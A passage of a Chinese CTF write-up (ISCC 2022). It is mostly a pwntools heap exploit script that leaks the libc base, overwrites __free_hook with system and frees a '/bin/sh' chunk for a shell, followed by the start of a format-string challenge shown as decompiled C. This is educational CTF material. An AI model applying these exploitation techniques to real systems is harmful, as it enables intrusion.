<span class="line" data-line="25"><span style="color:#E1E4E8">lg </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> s			: log.info(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\033</span><span style="color:#9ECBFF">[1;31;40m </span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF"> --> 0x</span><span style="color:#79B8FF">%x</span><span style="color:#79B8FF"> \033</span><span style="color:#9ECBFF">[0m'</span><span style="color:#F97583"> %</span><span style="color:#E1E4E8"> (s, </span><span style="color:#79B8FF">eval</span><span style="color:#E1E4E8">(s)))</span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">uu32 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data		: u32(data.ljust(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">uu64 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data		: u64(data.ljust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">ur64 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data		: u64(data.rjust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="29"></span>
<span class="line" data-line="30"><span style="color:#F97583">def</span><span style="color:#B392F0"> add</span><span style="color:#E1E4E8">(size,content):</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">	sl(</span><span style="color:#9ECBFF">'fill'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="32"><span style="color:#E1E4E8">	sl(</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(size))</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">	sl(content)</span></span>
<span class="line" data-line="34"><span style="color:#F97583">def</span><span style="color:#B392F0"> delete</span><span style="color:#E1E4E8">():</span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">	sl(</span><span style="color:#9ECBFF">'get'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="36"></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">buf </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">6010a0</span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">cmd </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">601160</span></span>
<span class="line" data-line="39"></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">41</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n =0</span></span>
<span class="line" data-line="41"><span style="color:#6A737D"># add(0x31,'a')#n=0</span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">pay </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'get'</span><span style="color:#E1E4E8">.ljust(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">61</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">b1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">a1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">91</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">71</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">61</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">70</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="43"><span style="color:#E1E4E8">sl(pay)</span></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">sl(</span><span style="color:#9ECBFF">'get'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=-1</span></span>
<span class="line" data-line="45"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=0</span></span>
<span class="line" data-line="46"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=1</span></span>
<span class="line" data-line="47"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=2</span></span>
<span class="line" data-line="48"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=3</span></span>
<span class="line" data-line="49"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=4</span></span>
<span class="line" data-line="50"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=5</span></span>
<span class="line" data-line="51"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=6</span></span>
<span class="line" data-line="52"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=7</span></span>
<span class="line" data-line="53"><span style="color:#E1E4E8">delete()</span></span>
<span class="line" data-line="54"><span style="color:#E1E4E8">delete()</span></span>
<span class="line" data-line="55"><span style="color:#E1E4E8">delete()</span></span>
<span class="line" data-line="56"><span style="color:#E1E4E8">delete()</span></span>
<span class="line" data-line="57"><span style="color:#E1E4E8">delete()</span></span>
<span class="line" data-line="58"><span style="color:#E1E4E8">delete()</span></span>
<span class="line" data-line="59"><span style="color:#E1E4E8">pay </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'get'</span><span style="color:#E1E4E8">.ljust(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">91</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">b1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">a1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">91</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">71</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">61</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="60"><span style="color:#E1E4E8">sl(pay)</span></span>
<span class="line" data-line="61"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">51</span><span style="color:#E1E4E8">,p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">70</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">*</span><span style="color:#79B8FF">2</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">91</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">31</span><span style="color:#E1E4E8">))</span><span style="color:#6A737D">#n=1</span></span>
<span class="line" data-line="62"><span style="color:#E1E4E8">delete()</span><span style="color:#6A737D">#n=0</span></span>
<span class="line" data-line="63"><span style="color:#E1E4E8">sl(</span><span style="color:#9ECBFF">'get'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=-1</span></span>
<span class="line" data-line="64"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">51</span><span style="color:#E1E4E8">,p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">70</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">70</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">*</span><span style="color:#79B8FF">2</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">91</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">31</span><span style="color:#E1E4E8">))</span><span style="color:#6A737D">#n=0</span></span>
<span class="line" data-line="65"><span style="color:#E1E4E8">sl(</span><span style="color:#9ECBFF">'get'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=-1</span></span>
<span class="line" data-line="66"><span style="color:#E1E4E8">libcbase </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> l64() </span><span style="color:#F97583">-0x</span><span style="color:#79B8FF">3ebca0</span></span>
<span class="line" data-line="67"><span style="color:#E1E4E8">lg(</span><span style="color:#9ECBFF">'libcbase'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="68"><span style="color:#E1E4E8">freehook </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libcbase </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> libc.symbols[</span><span style="color:#9ECBFF">'__free_hook'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="69"><span style="color:#E1E4E8">lg(</span><span style="color:#9ECBFF">'freehook'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="70"><span style="color:#E1E4E8">system </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libcbase </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> libc.symbols[</span><span style="color:#9ECBFF">'system'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="71"><span style="color:#E1E4E8">lg(</span><span style="color:#9ECBFF">'system'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="72"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#n=0</span></span>
<span class="line" data-line="73"></span>
<span class="line" data-line="74"><span style="color:#E1E4E8">pay </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'get'</span><span style="color:#E1E4E8">.ljust(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">91</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">b1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">a1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">91</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">71</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">61</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">40</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="75"><span style="color:#E1E4E8">sl(pay)</span><span style="color:#6A737D">#n = -1</span></span>
<span class="line" data-line="76"></span>
<span class="line" data-line="77"><span style="color:#E1E4E8">pay </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'fill'</span><span style="color:#E1E4E8">.ljust(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">91</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">b1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">a1</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">91</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(freehook) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">71</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">61</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(buf</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">40</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="78"><span style="color:#E1E4E8">sl(pay)</span><span style="color:#6A737D">#n = 0</span></span>
<span class="line" data-line="79"></span>
<span class="line" data-line="80"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">81</span><span style="color:#E1E4E8">,p64(system))</span></span>
<span class="line" data-line="81"><span style="color:#E1E4E8">add(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">41</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'/bin/sh</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="82"><span style="color:#E1E4E8">delete()</span></span>
<span class="line" data-line="83"><span style="color:#6A737D"># dbg()</span></span>
<span class="line" data-line="84"></span>
<span class="line" data-line="85"><span style="color:#E1E4E8">irt()</span></span></code></pre>
<h3 id="create_id">create_id</h3>
<p><code>ida x32</code> 打开，定位到 <code>main</code> 函数</p>
<p>简单的格式化字符串漏洞改写全局变量x，从而执行后门函数。</p>
<p><img src="https://img.5ime.cn/iscc-2022/image-20220525112208330.png" alt="image-20220525112208330"></p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line" data-line="1"><span style="color:#6A737D">// 在调用时检测到错误的sp值，输出可能是错误的!</span></span>
<span class="line" data-line="2"></span>
<span class="line" data-line="3"><span style="color:#E1E4E8"> </span></span>
<span class="line" data-line="4"><span style="color:#6A737D">// bad sp value at call has been detected, the output may be wrong!</span></span>
<span class="line" data-line="5"><span style="color:#F97583">int</span><span style="color:#E1E4E8"> __cdecl </span><span style="color:#B392F0">main</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int</span><span style="color:#FFAB70"> argc</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char</span><span style="color:#F97583"> **</span><span style="color:#FFAB70">argv</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char</span><span style="color:#F97583"> **</span><span style="color:#FFAB70">envp</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="7"><span style="color:#F97583">  unsigned</span><span style="color:#F97583"> int</span><span style="color:#E1E4E8"> v3;</span><span style="color:#6A737D"> // eax</span></span>
<span class="line" data-line="8"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> v4;</span><span style="color:#6A737D"> // esi</span></span>
<span class="line" data-line="9"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> v6;</span><span style="color:#6A737D"> // [esp+0h] [ebp-90h] BYREF</span></span>
<span class="line" data-line="10"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> i;</span><span style="color:#6A737D"> // [esp+4h] [ebp-8Ch]</span></span>
<span class="line" data-line="11"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> v8;</span><span style="color:#6A737D"> // [esp+8h] [ebp-88h]</span></span>
<span class="line" data-line="12"><span style="color:#F97583">  int</span><span style="color:#E1E4E8"> v9;</span><span style="color:#6A737D"> // [esp+Ch] [ebp-84h]</span></span>
<span class="line" data-line="13"><span style="color:#F97583">  char</span><span style="color:#FFAB70"> format</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">];</span><span style="color:#6A737D"> // [esp+10h] [ebp-80h] BYREF</span></span>
<span class="line" data-line="14"><span style="color:#F97583">  unsigned</span><span style="color:#F97583"> int</span><span style="color:#E1E4E8"> v11;</span><span style="color:#6A737D"> // [esp+74h] [ebp-1Ch]</span></span>
<span class="line" data-line="15"><span style="color:#F97583">  int</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">v12;</span><span style="color:#6A737D"> // [esp+80h] [ebp-10h]</span></span>
<span class="line" data-line="16"></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">  v12 </span><span style="color:#F97583">=</span><span style="color:#F97583"> &#x26;</span><span style="color:#E1E4E8">argc;</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">  v11 </span><span style="color:#F97583">=</span><span style="color:#B392F0"> __readgsdword</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">14</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="19"><span style="color:#B392F0">  init</span><span style="color:#E1E4E8">();</span></span>
<span class="line" data-line="20"><span style="color:#B392F0">  printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%p\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">x);</span></span>
<span class="line" data-line="21"><span style="color:#B392F0">  puts</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Guess a integer between 1~20^v^"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="22"><span style="color:#B392F0">  puts</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"You will get the user id after you finish it."</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="23"><span style="color:#F97583">  for</span><span style="color:#E1E4E8"> ( i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF"> 2</span><span style="color:#E1E4E8">; </span><span style="color:#F97583">++</span><span style="color:#E1E4E8">i )</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">  {</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">    v3 </span><span style="color:#F97583">=</span><span style="color:#B392F0"> time</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="26"><span style="color:#B392F0">    srand</span><span style="color:#E1E4E8">(v3);</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">    v4 </span><span style="color:#F97583">=</span><span style="color:#B392F0"> rand</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">%</span><span style="color:#79B8FF"> 10</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">    v8 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> v4 </span><span style="color:#F97583">+</span><span style="color:#B392F0"> rand</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">%</span><span style="color:#79B8FF"> 11</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="29"><span style="color:#B392F0">    __isoc99_scanf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">v6);</span></span>
<span class="line" data-line="30"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> ( v8 </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> v6 )</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">    {</span></span>
<span class="line" data-line="32"><span style="color:#B392F0">      printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Good!"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="33"><span style="color:#B392F0">      putchar</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="34"><span style="color:#F97583">      break</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="35"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="36"><span style="color:#B392F0">    puts</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"incorrect"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">  }</span></span>
<span class="line" data-line="38"><span style="color:#B392F0">  puts</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">What's your name?"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="39"><span style="color:#B392F0">  __isoc99_scanf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, format);</span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">  v9 </span><span style="color:#F97583">=</span><span style="color:#B392F0"> rand</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">%</span><span style="color:#79B8FF"> 100</span><span style="color:#F97583"> +</span><span style="color:#79B8FF"> 10</span><span style="color:#E1E4E8">;</span></span>
